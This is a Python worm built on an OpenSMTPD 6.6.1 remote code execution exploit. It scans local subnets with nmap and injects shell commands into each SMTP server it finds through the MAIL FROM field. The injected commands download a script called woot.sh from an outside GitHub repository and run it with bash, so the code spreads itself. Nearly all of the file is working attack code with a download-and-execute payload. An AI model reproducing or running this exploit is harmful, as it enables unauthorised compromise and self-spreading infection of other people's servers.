# Exploit Title: OpenSMTPD 6.6.1 - Remote Code Execution
# Date: 2020-01-29
# Exploit Author: 1F98D
# Date: 2022
	 
from socket import *
import sys
import time
import subprocess
import re
import argparse

def find_subnets():
	ifconfig = subprocess.check_output(['/usr/sbin/ifconfig'], text = True)
	# rn i want this example inet 172.19.0.1 
	strs = ifconfig.split("\n ")
	lst = []
	for item in strs:
		#item = re.search(r"inet \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", item)
		#if x != None:
		x = re.findall(r"inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", item)
		if x:
			if not x[0] == '127.0.0.1':
				lst.append(x[0])
			
	nmap_result = {}		
	for item in lst:
		nmap_return = subprocess.check_output(['/usr/bin/nmap', item + "/24"], text = True)
		
		nmap_return = nmap_return.split("\n ")
		for i in nmap_return:
			x = re.findall(r"\((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\)", i)
			if x:
				for v in x:
					nmap_result[v] = True	

	return nmap_result.keys() # return the resolution of ips that are up
	
def attack(nmap_res: list, PORT: int):
	for ADDR in nmap_res:
		print("Attacking: "+ ADDR + " " + str(PORT))
		CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']

		for cmdnum in range(len(CMD)):
			try:
				print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
				s = socket(AF_INET, SOCK_STREAM)
				s.connect((ADDR, PORT))
				res = s.recv(1024)
				if 'OpenSMTPD' not in str(res):
					print('[!] No OpenSMTPD detected')
					print('[!] Received {}'.format(str(res)))
					print('[!] Exiting...')
					sys.exit(1)

				print('[*] OpenSMTPD detected')
				s.send(b'HELO x\r\n')
				res = s.recv(1024)
				if '250' not in str(res):
					print('[!] Error connecting, expected 250')
					print('[!] Received: {}'.format(str(res)))
					print('[!] Exiting...')
					sys.exit(1)

				print('[*] Connected, sending payload' + CMD[cmdnum])
				s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
				res = s.recv(1024)
				if '250' not in str(res):
					print('[!] Error sending payload, expected 250')
					print('[!] Received: {}'.format(str(res)))
					print('[!] Exiting...')
					sys.exit(1)

				print('[*] Payload sent')
				s.send(b'RCPT TO:<root>\r\n')
				s.recv(1024)
				s.send(b'DATA\r\n')
				s.recv(1024)
				s.send(b'\r\nxxx\r\n.\r\n')
				s.recv(1024)
				s.send(b'QUIT\r\n')
				s.recv(1024)
				print('[*] Done')
				time.sleep(3)
				
			except ConnectionRefusedError and OSError:
				print("Connection error.")
				
				
						
def main():
	parser = argparse.ArgumentParser(description='A python worm.')
	parser.add_argument("-ma", "--manual", help="Set the IP and Port of the target manually.", nargs = '*')
	args = parser.parse_args()
	if args.manual != None: # check if there are arguments, if so activate manualy
		target = []
		target.append(args.manual[0])
		attack(target, int(args.manual[1]))
	else:
		attack(find_subnets(), 25)  # auto attack

if __name__ == "__main__":
	main()

